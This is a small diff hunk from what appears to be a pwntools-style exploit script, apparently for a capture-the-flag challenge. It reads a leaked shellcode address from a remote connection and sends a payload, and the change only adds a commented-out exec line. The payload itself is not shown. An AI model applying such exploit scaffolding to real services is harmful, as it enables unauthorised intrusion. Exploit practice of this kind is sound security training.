@@ -40,6 +40,8 @@ if is_debug:
 shellcode_addr=conn.recvuntil('?',drop=True)
 conn.sendlineafter('a', payload)
 
+# exec('n=1', globals())
+
 # drop=True
 # Message is : "hi?"
 conn.recvuntil('?',drop=True) # hi
